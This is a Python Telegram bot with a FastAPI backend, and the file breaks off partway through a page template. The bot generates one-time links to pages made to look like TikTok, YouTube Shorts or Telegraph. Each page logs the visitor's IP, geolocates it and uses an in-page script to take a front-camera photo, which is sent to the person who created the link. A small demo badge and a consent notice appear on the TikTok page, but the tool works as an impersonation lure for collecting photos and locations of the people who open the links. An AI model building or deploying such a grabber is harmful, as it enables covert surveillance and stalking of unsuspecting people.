import hashlib
import html
import json
import os
import secrets
import sqlite3
from contextlib import asynccontextmanager, closing
from pathlib import Path

import httpx
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    Update,
)
from fastapi import FastAPI, File, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles


# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")

PORT = int(os.getenv("PORT", "8000"))

DB_PATH = Path(
    os.getenv(
        "DB_PATH",
        "links.sqlite3",
    )
)

APP_DIR = Path(__file__).resolve().parent

MAX_PHOTO_BYTES = 10 * 1024 * 1024


# ============================================================
# WEBHOOK CONFIG
# ============================================================

_token_hash = hashlib.sha256(
    BOT_TOKEN.encode("utf-8")
).hexdigest()

WEBHOOK_PATH_KEY = os.getenv(
    "WEBHOOK_PATH_KEY",
    _token_hash[:32],
)

WEBHOOK_SECRET = os.getenv(
    "WEBHOOK_SECRET",
    _token_hash[32:64],
)

WEBHOOK_PATH = (
    f"/telegram-webhook/"
    f"{WEBHOOK_PATH_KEY}"
)

WEBHOOK_URL = (
    f"{PUBLIC_BASE_URL}"
    f"{WEBHOOK_PATH}"
)


# ============================================================
# TELEGRAM
# ============================================================

bot = Bot(BOT_TOKEN)

dp = Dispatcher()

router = Router()

dp.include_router(router)


# ============================================================
# SERVICES
# ============================================================

SERVICES = {
    "tiktok": {
        "name": "TikTok",
        "emoji": "🎵",
        "prefix": "tt",
        "path": "tiktok",
    },

    "youtube": {
        "name": "YouTube Shorts",
        "emoji": "📺",
        "prefix": "yt",
        "path": "youtube",
    },

    "telegraph": {
        "name": "Telegraph",
        "emoji": "📝",
        "prefix": "tg",
        "path": "telegraph",
    },
}


PREFIX_TO_SERVICE = {
    value["prefix"]: key
    for key, value in SERVICES.items()
}


DEFAULT_TELEGRAPH_TITLE = (
    "Статья Telegraph"
)

DEFAULT_TELEGRAPH_CONTENT = (
    "Это пример статьи, созданной через бота."
)


# ============================================================
# DATABASE
# ============================================================

def db_connect():
    return sqlite3.connect(
        DB_PATH,
        timeout=30,
    )


def db_init() -> None:

    DB_PATH.parent.mkdir(
        parents=True,
        exist_ok=True,
    )

    with closing(
        db_connect()
    ) as con:

        # ----------------------------------------------------
        # LINKS
        # ----------------------------------------------------

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS links (
                token TEXT PRIMARY KEY,
                owner_chat_id INTEGER NOT NULL,
                used INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                service TEXT NOT NULL DEFAULT 'tiktok',
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                show_photo INTEGER NOT NULL DEFAULT 1
            )
            """
        )

        columns = {
            row[1]
            for row in con.execute(
                "PRAGMA table_info(links)"
            ).fetchall()
        }

        if "service" not in columns:

            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN service TEXT
                NOT NULL DEFAULT 'tiktok'
                """
            )

        if "title" not in columns:

            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN title TEXT
                DEFAULT ''
                """
            )

        if "content" not in columns:

            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN content TEXT
                DEFAULT ''
                """
            )

        if "show_photo" not in columns:

            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN show_photo INTEGER
                NOT NULL DEFAULT 1
                """
            )

        # ----------------------------------------------------
        # TELEGRAPH DRAFT
        # ----------------------------------------------------

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS telegraph_drafts (
                chat_id INTEGER PRIMARY KEY,
                step TEXT NOT NULL,
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )

        # ----------------------------------------------------
        # PROCESSED TELEGRAM UPDATES
        # ----------------------------------------------------

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS processed_updates (
                update_id INTEGER PRIMARY KEY,
                processed_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )

        con.commit()


# ============================================================
# TELEGRAPH DRAFT
# ============================================================

def set_telegraph_draft(
    chat_id: int,
    step: str,
    title: str = "",
    content: str = "",
) -> None:

    with closing(
        db_connect()
    ) as con:

        con.execute(
            """
            INSERT INTO telegraph_drafts (
                chat_id,
                step,
                title,
                content,
                updated_at
            )
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)

            ON CONFLICT(chat_id)
            DO UPDATE SET
                step = excluded.step,
                title = excluded.title,
                content = excluded.content,
                updated_at = CURRENT_TIMESTAMP
            """,
            (
                chat_id,
                step,
                title,
                content,
            ),
        )

        con.commit()


def get_telegraph_draft(
    chat_id: int
):

    with closing(
        db_connect()
    ) as con:

        return con.execute(
            """
            SELECT
                step,
                title,
                content

            FROM telegraph_drafts

            WHERE chat_id = ?
            """,
            (
                chat_id,
            ),
        ).fetchone()


def clear_telegraph_draft(
    chat_id: int
) -> None:

    with closing(
        db_connect()
    ) as con:

        con.execute(
            """
            DELETE FROM telegraph_drafts
            WHERE chat_id = ?
            """,
            (
                chat_id,
            ),
        )

        con.commit()


# ============================================================
# TELEGRAM UPDATE DEDUPLICATION
# ============================================================

def claim_update(
    update_id: int
) -> bool:

    try:

        with closing(
            db_connect()
        ) as con:

            con.execute(
                """
                INSERT INTO processed_updates (
                    update_id
                )
                VALUES (?)
                """,
                (
                    update_id,
                ),
            )

            # Не раздуваем таблицу бесконечно.

            con.execute(
                """
                DELETE FROM processed_updates
                WHERE update_id < ?
                """,
                (
                    max(
                        0,
                        update_id - 5000,
                    ),
                ),
            )

            con.commit()

        return True

    except sqlite3.IntegrityError:

        return False


def release_update(
    update_id: int
) -> None:

    with closing(
        db_connect()
    ) as con:

        con.execute(
            """
            DELETE FROM processed_updates
            WHERE update_id = ?
            """,
            (
                update_id,
            ),
        )

        con.commit()


# ============================================================
# LINKS
# ============================================================

def create_link(
    owner_chat_id: int,
    service: str,
    title: str = "",
    content: str = "",
    show_photo: bool = True,
) -> str:

    if service not in SERVICES:

        raise ValueError(
            f"Unknown service: {service}"
        )

    prefix = (
        SERVICES[service]["prefix"]
    )

    while True:

        # ----------------------------------------------------
        # ВАЖНО:
        #
        # TikTok:
        # tt_xxxxx
        #
        # YouTube:
        # yt_xxxxx
        #
        # Telegraph:
        # tg_xxxxx
        #
        # Поэтому сервис уже зашит
        # непосредственно в token.
        # ----------------------------------------------------

        token = (
            f"{prefix}_"
            f"{secrets.token_urlsafe(18)}"
        )

        try:

            with closing(
                db_connect()
            ) as con:

                con.execute(
                    """
                    INSERT INTO links (
                        token,
                        owner_chat_id,
                        used,
                        service,
                        title,
                        content,
                        show_photo
                    )
                    VALUES (
                        ?,
                        ?,
                        0,
                        ?,
                        ?,
                        ?,
                        ?
                    )
                    """,
                    (
                        token,
                        owner_chat_id,
                        service,
                        title,
                        content,
                        1 if show_photo else 0,
                    ),
                )

                con.commit()

            return token

        except sqlite3.IntegrityError:

            continue


def get_link(
    token: str
):

    with closing(
        db_connect()
    ) as con:

        return con.execute(
            """
            SELECT
                owner_chat_id,
                used,
                service,
                title,
                content,
                show_photo

            FROM links

            WHERE token = ?
            """,
            (
                token,
            ),
        ).fetchone()


def resolve_link(
    identifier: str,
    expected_service: str,
):

    if expected_service not in SERVICES:
        return None

    # --------------------------------------------------------
    # Для новых ссылок сначала смотрим prefix.
    #
    # tt_ НЕ МОЖЕТ открыться как YouTube/Telegraph.
    # yt_ НЕ МОЖЕТ открыться как TikTok/Telegraph.
    # tg_ НЕ МОЖЕТ открыться как TikTok/YouTube.
    # --------------------------------------------------------

    if "_" in identifier:

        prefix = identifier.split(
            "_",
            1,
        )[0]

        encoded_service = (
            PREFIX_TO_SERVICE.get(
                prefix
            )
        )

        if (
            encoded_service is not None
            and
            encoded_service
            != expected_service
        ):

            return None

    with closing(
        db_connect()
    ) as con:

        # ----------------------------------------------------
        # EXACT TOKEN
        # ----------------------------------------------------

        exact = con.execute(
            """
            SELECT
                token,
                owner_chat_id,
                used,
                service,
                title,
                content,
                show_photo

            FROM links

            WHERE token = ?
              AND service = ?
            """,
            (
                identifier,
                expected_service,
            ),
        ).fetchone()

        if exact:

            return exact

        # ----------------------------------------------------
        # Старые ссылки из предыдущих версий.
        #
        # Только если identifier = 8 символов.
        # И только внутри НУЖНОГО service.
        # ----------------------------------------------------

        if len(identifier) == 8:

            rows = con.execute(
                """
                SELECT
                    token,
                    owner_chat_id,
                    used,
                    service,
                    title,
                    content,
                    show_photo

                FROM links

                WHERE token LIKE ?
                  AND service = ?

                LIMIT 2
                """,
                (
                    f"{identifier}%",
                    expected_service,
                ),
            ).fetchall()

            if len(rows) == 1:

                return rows[0]

    return None


def claim_link(
    token: str
) -> bool:

    with closing(
        db_connect()
    ) as con:

        cursor = con.execute(
            """
            UPDATE links

            SET used = 2

            WHERE token = ?
              AND used = 0
            """,
            (
                token,
            ),
        )

        con.commit()

        return (
            cursor.rowcount == 1
        )


def finish_link(
    token: str
) -> None:

    with closing(
        db_connect()
    ) as con:

        con.execute(
            """
            UPDATE links
            SET used = 1
            WHERE token = ?
            """,
            (
                token,
            ),
        )

        con.commit()


def release_link(
    token: str
) -> None:

    with closing(
        db_connect()
    ) as con:

        con.execute(
            """
            UPDATE links
            SET used = 0

            WHERE token = ?
              AND used = 2
            """,
            (
                token,
            ),
        )

        con.commit()


# ============================================================
# PUBLIC URL
# ============================================================

def service_from_token(
    token: str
) -> str:

    prefix = token.split(
        "_",
        1,
    )[0]

    service = (
        PREFIX_TO_SERVICE.get(
            prefix
        )
    )

    if not service:

        raise ValueError(
            f"Unknown token prefix: {prefix}"
        )

    return service


def public_link(
    token: str
) -> str:

    # --------------------------------------------------------
    # Сервис определяется по TOKEN,
    # а не по состоянию Telegram.
    #
    # Поэтому невозможно создать
    # yt_ token и случайно получить
    # Telegraph URL.
    # --------------------------------------------------------

    service = (
        service_from_token(
            token
        )
    )

    path = (
        SERVICES[service]["path"]
    )

    return (
        f"{PUBLIC_BASE_URL}"
        f"/{path}"
        f"/{token}"
    )


# ============================================================
# INLINE KEYBOARDS
# ============================================================

def service_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎵 TikTok",
                    callback_data=(
                        "service:tiktok"
                    ),
                )
            ],

            [
                InlineKeyboardButton(
                    text="📺 YouTube Shorts",
                    callback_data=(
                        "service:youtube"
                    ),
                )
            ],

            [
                InlineKeyboardButton(
                    text="📝 Telegraph",
                    callback_data=(
                        "service:telegraph"
                    ),
                )
            ],
        ]
    )


def skip_title_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="⏭ Пропустить",
                    callback_data=(
                        "tg:skip:title"
                    ),
                )
            ]
        ]
    )


def skip_content_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="⏭ Пропустить",
                    callback_data=(
                        "tg:skip:content"
                    ),
                )
            ]
        ]
    )


def photo_choice_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Да",
                    callback_data=(
                        "tg:photo:yes"
                    ),
                ),

                InlineKeyboardButton(
                    text="❌ Нет",
                    callback_data=(
                        "tg:photo:no"
                    ),
                ),
            ]
        ]
    )


def finished_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=(
                        "🔗 Создать новую ссылку"
                    ),
                    callback_data="new_link",
                )
            ]
        ]
    )


# ============================================================
# SEND GENERATED LINK
# ============================================================

async def send_created_link(
    message: Message,
    token: str,
) -> None:

    # --------------------------------------------------------
    # ЕЩЁ ОДНА ЗАЩИТА.
    #
    # Тут service вообще не передаётся.
    # Он определяется из prefix самого token.
    # --------------------------------------------------------

    service = (
        service_from_token(
            token
        )
    )

    info = SERVICES[service]

    url = public_link(token)

    await message.answer(
        (
            f"{info['emoji']} "
            f"Одноразовая ссылка создана:\n\n"

            f"Оформление: "
            f"<b>"
            f"{html.escape(info['name'])}"
            f"</b>\n\n"

            f"<a href=\""
            f"{html.escape(url, quote=True)}"
            f"\">"
            f"{html.escape(url)}"
            f"</a>"
        ),

        parse_mode="HTML",

        # Не даём Telegram строить
        # старую/закешированную preview-card.
        disable_web_page_preview=True,

        reply_markup=(
            finished_keyboard()
        ),
    )


# ============================================================
# TELEGRAM — /start
# ============================================================

@router.message(
    CommandStart()
)
async def start(
    message: Message
):

    clear_telegraph_draft(
        message.chat.id
    )

    await message.answer(
        (
            "👋 Выберите "
            "оформление страницы:"
        ),
        reply_markup=(
            service_keyboard()
        ),
    )


# ============================================================
# TELEGRAM — /new
# ============================================================

@router.message(
    Command("new")
)
async def new_command(
    message: Message
):

    clear_telegraph_draft(
        message.chat.id
    )

    await message.answer(
        (
            "Выберите оформление "
            "новой ссылки:"
        ),
        reply_markup=(
            service_keyboard()
        ),
    )


# ============================================================
# TELEGRAM — CREATE NEW LINK BUTTON
# ============================================================

@router.callback_query(
    F.data == "new_link"
)
async def new_link_callback(
    callback: CallbackQuery
):

    await callback.answer()

    chat_id = (
        callback.message.chat.id
    )

    clear_telegraph_draft(
        chat_id
    )

    await callback.message.answer(
        (
            "Выберите оформление "
            "новой ссылки:"
        ),
        reply_markup=(
            service_keyboard()
        ),
    )


# ============================================================
# TELEGRAM — SERVICE SELECTION
# ============================================================

@router.callback_query(
    F.data.startswith(
        "service:"
    )
)
async def choose_service(
    callback: CallbackQuery
):

    await callback.answer()

    service = (
        callback.data.split(
            ":",
            1,
        )[1]
    )

    if service not in SERVICES:
        return

    chat_id = (
        callback.message.chat.id
    )

    clear_telegraph_draft(
        chat_id
    )

    # --------------------------------------------------------
    # TELEGRAPH
    # --------------------------------------------------------

    if service == "telegraph":

        set_telegraph_draft(
            chat_id,
            "title",
        )

        await callback.message.answer(
            (
                "📝 Введите "
                "заголовок статьи:"
            ),
            reply_markup=(
                skip_title_keyboard()
            ),
        )

        return

    # --------------------------------------------------------
    # TIKTOK / YOUTUBE
    # --------------------------------------------------------

    token = create_link(
        owner_chat_id=chat_id,
        service=service,
    )

    await send_created_link(
        callback.message,
        token,
    )


# ============================================================
# TELEGRAPH — SKIP TITLE
# ============================================================

@router.callback_query(
    F.data == "tg:skip:title"
)
async def skip_telegraph_title(
    callback: CallbackQuery
):

    await callback.answer()

    chat_id = (
        callback.message.chat.id
    )

    draft = (
        get_telegraph_draft(
            chat_id
        )
    )

    if (
        not draft
        or draft[0] != "title"
    ):
        return

    set_telegraph_draft(
        chat_id,
        "content",
        title=(
            DEFAULT_TELEGRAPH_TITLE
        ),
    )

    await callback.message.answer(
        "✍️ Введите текст статьи:",
        reply_markup=(
            skip_content_keyboard()
        ),
    )


# ============================================================
# TELEGRAPH — SKIP CONTENT
# ============================================================

@router.callback_query(
    F.data == "tg:skip:content"
)
async def skip_telegraph_content(
    callback: CallbackQuery
):

    await callback.answer()

    chat_id = (
        callback.message.chat.id
    )

    draft = (
        get_telegraph_draft(
            chat_id
        )
    )

    if (
        not draft
        or draft[0] != "content"
    ):
        return

    _, title, _ = draft

    set_telegraph_draft(
        chat_id,
        "photo",

        title=(
            title
            or
            DEFAULT_TELEGRAPH_TITLE
        ),

        content=(
            DEFAULT_TELEGRAPH_CONTENT
        ),
    )

    await callback.message.answer(
        (
            "🖼 Добавить photo.png "
            "в статью?"
        ),
        reply_markup=(
            photo_choice_keyboard()
        ),
    )


# ============================================================
# TELEGRAPH — PHOTO YES / NO
# ============================================================

@router.callback_query(
    F.data.in_(
        {
            "tg:photo:yes",
            "tg:photo:no",
        }
    )
)
async def telegraph_photo_choice(
    callback: CallbackQuery
):

    await callback.answer()

    chat_id = (
        callback.message.chat.id
    )

    draft = (
        get_telegraph_draft(
            chat_id
        )
    )

    if (
        not draft
        or draft[0] != "photo"
    ):
        return

    _, title, content = draft

    show_photo = (
        callback.data
        ==
        "tg:photo:yes"
    )

    token = create_link(
        owner_chat_id=chat_id,

        service="telegraph",

        title=(
            title
            or
            DEFAULT_TELEGRAPH_TITLE
        ),

        content=(
            content
            or
            DEFAULT_TELEGRAPH_CONTENT
        ),

        show_photo=show_photo,
    )

    clear_telegraph_draft(
        chat_id
    )

    await send_created_link(
        callback.message,
        token,
    )


# ============================================================
# TELEGRAPH — USER TEXT
# ============================================================

@router.message(
    F.text
)
async def telegraph_text_input(
    message: Message
):

    chat_id = message.chat.id

    draft = (
        get_telegraph_draft(
            chat_id
        )
    )

    # Если Telegraph сейчас не создаётся,
    # обычный текст игнорируем.
    if not draft:
        return

    (
        step,
        saved_title,
        saved_content,
    ) = draft

    text = (
        message.text
        or ""
    ).strip()

    # --------------------------------------------------------
    # TITLE
    # --------------------------------------------------------

    if step == "title":

        title = (
            text
            or
            DEFAULT_TELEGRAPH_TITLE
        )

        set_telegraph_draft(
            chat_id,
            "content",
            title=title,
        )

        # ВАЖНО:
        # сразу после заголовка
        # просим текст.
        await message.answer(
            "✍️ Введите текст статьи:",
            reply_markup=(
                skip_content_keyboard()
            ),
        )

        return

    # --------------------------------------------------------
    # CONTENT
    # --------------------------------------------------------

    if step == "content":

        content = (
            text
            or
            DEFAULT_TELEGRAPH_CONTENT
        )

        set_telegraph_draft(
            chat_id,
            "photo",

            title=(
                saved_title
                or
                DEFAULT_TELEGRAPH_TITLE
            ),

            content=content,
        )

        await message.answer(
            (
                "🖼 Добавить photo.png "
                "в статью?"
            ),
            reply_markup=(
                photo_choice_keyboard()
            ),
        )

        return


# ============================================================
# CLIENT IP
# ============================================================

def client_ip(
    request: Request
) -> str:

    cf = request.headers.get(
        "cf-connecting-ip"
    )

    if cf:

        return cf.strip()

    xff = request.headers.get(
        "x-forwarded-for"
    )

    if xff:

        return xff.split(
            ",",
            1,
        )[0].strip()

    if request.client:

        return request.client.host

    return "unknown"


# ============================================================
# IP LOOKUP
# ============================================================

async def lookup_ip(
    ip: str
) -> dict:

    if ip in {
        "unknown",
        "127.0.0.1",
        "::1",
    }:

        return {}

    try:

        async with httpx.AsyncClient(
            timeout=6.0
        ) as client:

            response = await client.get(
                f"https://ipwho.is/{ip}"
            )

            response.raise_for_status()

            data = response.json()

            if not data.get(
                "success",
                True,
            ):

                return {}

            return data

    except Exception:

        return {}


# ============================================================
# CAMERA SCRIPT
# ============================================================

def camera_script(
    token: str
) -> str:

    return f"""
<script>

const token =
    {json.dumps(token)};

const video =
    document.getElementById(
        'video'
    );

const preview =
    document.getElementById(
        'preview'
    );

const statusEl =
    document.getElementById(
        'status'
    );

const cameraBtn =
    document.getElementById(
        'cameraBtn'
    );

const sendBtn =
    document.getElementById(
        'sendBtn'
    );


let stream = null;

let sending = false;


/* ==========================================================
   CAMERA
   ========================================================== */

cameraBtn.addEventListener(
    'click',
    async () => {{

        try {{

            if (
                !navigator.mediaDevices
                ||
                !navigator.mediaDevices
                    .getUserMedia
            ) {{

                throw new Error(
                    'Камера недоступна '
                    + 'в этом браузере'
                );

            }}


            stream =
                await navigator
                    .mediaDevices
                    .getUserMedia(
                        {{

                            video: {{
                                facingMode:
                                    'user'
                            }},

                            audio: false

                        }}
                    );


            video.srcObject =
                stream;


            video.style.display =
                'block';


            if (preview) {{

                preview.style.display =
                    'none';

            }}


            cameraBtn.style.display =
                'none';


            sendBtn.style.display =
                'block';


            statusEl.textContent =
                'Камера включена. '
                + 'Фото ещё не отправлено.';

        }}

        catch (error) {{

            statusEl.textContent =
                'Ошибка: '
                + error.message;

        }}

    }}
);


/* ==========================================================
   SEND PHOTO
   ========================================================== */

sendBtn.addEventListener(
    'click',
    async () => {{

        if (
            !stream
            ||
            sending
        ) {{

            return;

        }}


        sending = true;

        sendBtn.disabled = true;

        statusEl.textContent =
            'Отправка…';


        try {{

            await new Promise(
                resolve => {{

                    if (
                        video.readyState >= 2
                    ) {{

                        resolve();

                    }}

                    else {{

                        video.onloadeddata =
                            resolve;

                    }}

                }}
            );


            const canvas =
                document.createElement(
                    'canvas'
                );


            canvas.width =
                video.videoWidth
                ||
                720;


            canvas.height =
                video.videoHeight
                ||
                1280;


            const ctx =
                canvas.getContext(
                    '2d'
                );


            ctx.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );


            const blob =
                await new Promise(
                    resolve =>

                        canvas.toBlob(
                            resolve,
                            'image/jpeg',
                            0.92
                        )

                );


            if (!blob) {{

                throw new Error(
                    'Не удалось '
                    + 'создать снимок'
                );

            }}


            const form =
                new FormData();


            form.append(
                'photo',
                blob,
                'photo.jpg'
            );


            const response =
                await fetch(

                    '/api/send/'
                    + encodeURIComponent(
                        token
                    ),

                    {{
                        method: 'POST',
                        body: form
                    }}

                );


            const data =
                await response
                    .json()
                    .catch(
                        () => ({{}})
                    );


            if (!response.ok) {{

                throw new Error(
                    data.detail
                    ||
                    'Ошибка отправки'
                );

            }}


            stream
                .getTracks()
                .forEach(
                    track =>
                        track.stop()
                );


            video.style.display =
                'none';


            if (preview) {{

                preview.style.display =
                    'block';

            }}


            sendBtn.style.display =
                'none';


            statusEl.textContent =
                'Фото отправлено.';

        }}

        catch (error) {{

            sending = false;

            sendBtn.disabled = false;

            statusEl.textContent =
                'Ошибка: '
                + error.message;

        }}

    }}
);


/* ==========================================================
   CLOCK
   ========================================================== */

(function updateClock() {{

    const clock =
        document.getElementById(
            'clock'
        );


    if (!clock) {{

        return;

    }}


    const now =
        new Date();


    clock.textContent =
        now.toLocaleTimeString(
            'ru-RU',

            {{
                hour: '2-digit',
                minute: '2-digit'
            }}
        );

}})();

</script>
"""


# ============================================================
# TIKTOK PAGE
# ============================================================

def generate_tiktok_page(
    token: str
) -> str:

    photo_url = (
        f"{PUBLIC_BASE_URL}"
        f"/static/photo.png"
    )

    script = (
        camera_script(
            token
        )
    )

    return f"""
<!DOCTYPE html>

<html lang="ru">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="
        width=device-width,
        initial-scale=1,
        maximum-scale=1,
        viewport-fit=cover
    "
>

<title>
    Short video demo
</title>


<style>

* {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}}


html,
body {{
    width: 100%;
    height: 100%;

    background: #000;
    color: #fff;

    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Arial,
        sans-serif;
}}


body {{
    display: flex;

    justify-content: center;

    overflow: hidden;
}}


.phone {{
    position: relative;

    width: 100%;
    max-width: 590px;

    height: 100svh;

    background: #000;

    overflow: hidden;
}}


.media {{
    position: absolute;

    top: 0;
    left: 0;
    right: 0;
    bottom: 64px;

    width: 100%;

    height:
        calc(
            100%
            - 64px
        );

    object-fit: cover;

    background: #111;
}}


#video {{
    display: none;
}}


.shade {{
    position: absolute;

    inset:
        0
        0
        64px
        0;

    pointer-events: none;

    background:
        linear-gradient(
            180deg,

            rgba(
                0,
                0,
                0,
                .25
            ),

            transparent
            28%,

            transparent
            60%,

            rgba(
                0,
                0,
                0,
                .78
            )
        );
}}


/* ==========================================================
   STATUS
   ========================================================== */

.statusbar {{
    position: absolute;

    z-index: 10;

    top:
        max(
            9px,
            env(
                safe-area-inset-top
            )
        );

    left: 20px;
    right: 17px;

    display: flex;

    justify-content:
        space-between;

    align-items: center;

    font-size: 16px;
    font-weight: 700;

    text-shadow:
        0
        1px
        4px
        #000;
}}


.status-icons {{
    display: flex;

    gap: 7px;

    align-items: center;

    font-size: 12px;
}}


.battery {{
    border:
        1.4px
        solid
        #fff;

    border-radius: 4px;

    padding:
        1px
        5px;
}}


/* ==========================================================
   TOP TABS
   ========================================================== */

.tabs {{
    position: absolute;

    z-index: 10;

    top:
        max(
            46px,
            calc(
                env(
                    safe-area-inset-top
                )
                + 38px
            )
        );

    left: 12px;
    right: 12px;

    display: flex;

    align-items: center;

    gap: 13px;

    font-size: 14px;

    font-weight: 700;

    white-space: nowrap;

    text-shadow:
        0
        1px
        5px
        #000;
}}


.tabs .dim {{
    opacity: .68;
}}


.tabs .active::after {{
    content: "";

    display: block;

    width: 31px;
    height: 2px;

    background: #fff;

    border-radius: 9px;

    margin:
        6px
        auto
        0;
}}


.search {{
    margin-left: auto;

    font-size: 27px;
}}


.demo {{
    position: absolute;

    z-index: 18;

    top:
        max(
            82px,
            calc(
                env(
                    safe-area-inset-top
                )
                + 74px
            )
        );

    left: 50%;

    transform:
        translateX(
            -50%
        );

    padding:
        4px
        8px;

    border-radius:
        999px;

    background:
        rgba(
            0,
            0,
            0,
            .72
        );

    border:
        1px
        solid
        rgba(
            255,
            255,
            255,
            .45
        );

    font-size: 9px;

    font-weight: 800;

    white-space: nowrap;
}}


/* ==========================================================
   ACTIONS
   ========================================================== */

.actions {{
    position: absolute;

    z-index: 9;

    right: 6px;

    bottom: 122px;

    display: flex;

    flex-direction: column;

    align-items: center;

    gap: 15px;

    text-shadow:
        0
        1px
        5px
        #000;
}}


.avatar-wrap {{
    position: relative;

    margin-bottom: 6px;
}}


.avatar {{
    width: 49px;
    height: 49px;

    border-radius: 50%;

    border:
        2px
        solid
        #fff;

    background: #333;

    display: grid;

    place-items: center;

    font-weight: 800;
}}


.follow {{
    position: absolute;

    left: 13px;

    bottom: -9px;

    width: 23px;
    height: 23px;

    border-radius: 50%;

    background: #fe2c55;

    display: grid;

    place-items: center;

    font-size: 20px;
}}


.action {{
    width: 64px;

    display: flex;

    flex-direction: column;

    align-items: center;

    gap: 2px;

    font-size: 11px;

    font-weight: 700;
}}


.action-icon {{
    font-size: 34px;

    line-height: 35px;
}}


/* ==========================================================
   TEXT
   ========================================================== */

.copy {{
    position: absolute;

    z-index: 9;

    left: 16px;

    right: 77px;

    bottom: 80px;

    text-shadow:
        0
        1px
        5px
        #000;
}}


.username {{
    font-size: 16px;

    font-weight: 800;

    margin-bottom: 7px;
}}


.caption {{
    font-size: 14px;

    line-height: 1.28;

    margin-bottom: 6px;
}}


.music {{
    font-size: 13px;

    white-space: nowrap;

    overflow: hidden;

    text-overflow:
        ellipsis;
}}


/* ==========================================================
   BOTTOM NAV
   ========================================================== */

.nav {{
    position: absolute;

    z-index: 12;

    left: 0;
    right: 0;
    bottom: 0;

    height: 64px;

    background: #050505;

    border-top:
        1px
        solid
        rgba(
            255,
            255,
            255,
            .08
        );

    display: flex;

    align-items: center;

    justify-content:
        space-around;
}}


.nav-item {{
    min-width: 62px;

    display: flex;

    flex-direction: column;

    align-items: center;

    gap: 2px;

    font-size: 9px;
}}


.nav-icon {{
    font-size: 25px;

    line-height: 26px;
}}


.plus {{
    width: 45px;
    height: 29px;

    border-radius: 7px;

    background: #fff;

    color: #000;

    display: grid;

    place-items: center;

    font-size: 26px;

    box-shadow:
        -4px 0 #25f4ee,
        4px 0 #fe2c55;
}}


/* ==========================================================
   CONSENT
   ========================================================== */

.consent {{
    position: absolute;

    z-index: 30;

    left: 9px;
    right: 9px;

    bottom: 71px;

    padding:
        10px
        11px;

    border-radius: 14px;

    background:
        rgba(
            10,
            10,
            10,
            .94
        );

    border:
        1px
        solid
        rgba(
            255,
            255,
            255,
            .26
        );

    backdrop-filter:
        blur(
            14px
        );
}}


.consent p {{
    font-size: 11px;

    line-height: 1.35;

    margin-bottom: 8px;
}}


.btnrow {{
    display: flex;

    gap: 7px;
}}


button {{
    flex: 1;

    border: 0;

    border-radius: 10px;

    padding: 9px;

    font-size: 12px;

    font-weight: 800;

    cursor: pointer;
}}


#cameraBtn {{
    background: #fff;

    color: #111;
}}


#sendBtn {{
    display: none;

    background: #fe2c55;

    color: #fff;
}}


#status {{
    min-height: 14px;

    margin-top: 5px;

    font-size: 10px;

    color: #ddd;
}}

</style>

</head>


<body>


<div class="phone">


    <img
        class="media"
        id="preview"
        src="{photo_url}"
        alt="Видео-превью"
    >


    <video
        class="media"
        id="video"
        playsinline
        autoplay
        muted
    ></video>


    <div class="shade"></div>


    <div class="statusbar">

        <span id="clock">
            16:28
        </span>

        <span class="status-icons">

            <span>
                ▮▮▮
            </span>

            <span>
                ◓
            </span>

            <span class="battery">
                83
            </span>

        </span>

    </div>


    <div class="tabs">

        <span class="dim">
            LIVE
        </span>

        <span class="dim">
            Сообщество
        </span>

        <span class="dim">
            Подписки
        </span>

        <span class="active">
            Рекомендации
        </span>

        <span class="search">
            ⌕
        </span>

    </div>


    <div class="demo">
        ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TIKTOK
    </div>


    <div class="actions">

        <div class="avatar-wrap">

            <div class="avatar">
                V
            </div>

            <div class="follow">
                +
            </div>

        </div>


        <div class="action">

            <span class="action-icon">
                ♥
            </span>

            <span>
                100,3 тыс.
            </span>

        </div>


        <div class="action">

            <span class="action-icon">
                ●
            </span>

            <span>
                575
            </span>

        </div>


        <div class="action">

            <span class="action-icon">
                ▮
            </span>

            <span>
                12,8 тыс.
            </span>

        </div>


        <div class="action">

            <span class="action-icon">
                ↗
            </span>

            <span>
                5720
            </span>

        </div>

    </div>


    <div class="copy">

        <div class="username">
            @verhcau
        </div>

        <div class="caption">
            Твоё ежедневное короткое видео.
        </div>

        <div class="music">
            ♫ Оригинальный звук — verhcau
        </div>

    </div>


    <div class="consent">

        <p>
            Демо-страница. Камера включится
            только после вашего нажатия.
            При отправке снимок и IP-данные
            будут переданы владельцу этой ссылки.
        </p>

        <div class="btnrow">

            <button id="cameraBtn">
                Разрешить камеру
            </button>

            <button id="sendBtn">
                Сделать и отправить
            </button>

        </div>

        <div id="status"></div>

    </div>


    <div class="nav">

        <div class="nav-item">

            <span class="nav-icon">
